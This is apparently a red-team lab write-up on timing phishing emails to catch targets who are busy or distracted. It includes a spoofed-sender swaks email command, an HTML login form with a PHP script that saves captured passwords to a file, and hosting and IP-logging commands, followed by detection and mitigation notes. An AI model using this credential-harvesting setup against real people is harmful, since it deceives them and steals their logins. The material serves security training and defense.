## **Law 35 — Master the Art of Timing**

Interpretation (offensive context):  
The same pretext can fail or succeed purely based on **when** it is delivered. You target moments of **cognitive overload, routine transitions, or urgency windows** to reduce scrutiny and increase compliance.

---

# 🎯 Attack Scenario — _Timing-Optimized Phish (Cognitive Load Exploitation)_

You deliver the payload at a time when the user is:

- busy
    
- distracted
    
- transitioning between tasks
    

**Persona:**

> _Dmitry Volkov_, 20 y/o IT Ops Intern

---

# 🔴 Red Team Objective

- Increase:
    
    - success probability via **timing**
        
- Reduce:
    
    - user analysis / verification
        
- Achieve:
    
    - fast, uncritical action
        

---

# 🖥️ Lab Setup

### VMs:

- **Kali (Attacker)** — 3GB
    
- **Ubuntu Victim** — 2GB
    

### Network:

- Host-only
    

---

# ⚙️ Operator Workflow

## Phase 1 — Identify High-Probability Timing Windows

Optimal moments:

- start of workday (email backlog)
    
- just before meetings
    
- end of day (fatigue)
    

👉 In lab: simulate timing logic

---

## Phase 2 — Timed Delivery

### Example (simulate “morning rush”):

```bash
sleep 10
swaks --to target@corp.local \
--from dmitry.v@corp.local \
--server 192.168.56.101 \
--data "Subject: Quick verification

Please confirm access before your next session:

http://192.168.56.101:8080"
```

👉 Message is:

- short
    
- aligned with timing (“before next session”)
    

---

## Phase 3 — Payload

```bash
mkdir timing && cd timing
```

```html
<form action="cap.php" method="POST">
<input name="user" placeholder="Email">
<input type="password" name="pass" placeholder="Password">
<button>Confirm</button>
</form>
```

```php
<?php
file_put_contents("creds.txt", $_POST['user']." ".$_POST['pass']."\n", FILE_APPEND);
?>
```

---

## Phase 4 — Hosting

```bash
php -S 0.0.0.0:8080
```

---

## Phase 5 — Execution

Target state:

- busy / distracted
    
- low cognitive bandwidth
    

Result:

- quick action
    
- minimal verification
    

👉 Timing amplifies effectiveness

---

# 🛠️ Tooling + Commands

### Timing simulation:

```bash
sleep 10
```

---

### Delivery:

```bash
swaks --to target@corp.local --from dmitry.v@corp.local
```

---

### Hosting:

```bash
php -S 0.0.0.0:8080
```

---

### Logging:

```php
file_put_contents("log.txt", $_SERVER['REMOTE_ADDR']."\n", FILE_APPEND);
```

---

# 🧠 Social Engineering Mapping (Hadnagy)

Relevant concepts:

- **Cognitive overload exploitation**
    
- **Context-aware attacks**
    
- **Behavioral timing**
    

Key principle:

> The same attack works better at the right moment

---

# 🛡️ Detection & Defensive Insight

Indicators:

- attacks clustered around:
    
    - peak work hours
        
    - shift changes
        
- urgency tied to timing
    

Mitigation:

- user training:
    
    - “Busy ≠ safe to act quickly”
        
- monitoring:
    
    - time-based attack patterns
        
- enforce:
    
    - verification regardless of timing
        

---

# 📄 Report Artifact

### Title:

> Credential Harvest via Timing-Based Cognitive Load Exploitation

### Include:

- timing strategy
    
- message design
    
- credential capture
    
- analysis:
    
    - how timing influenced behavior
        
- impact:
    
    - increased success via timing
        

---

# ⚠️ Operator Insight

Right message + wrong time → failure  
Average message + right time → success

Timing is not support  
It is a **force multiplier**

---

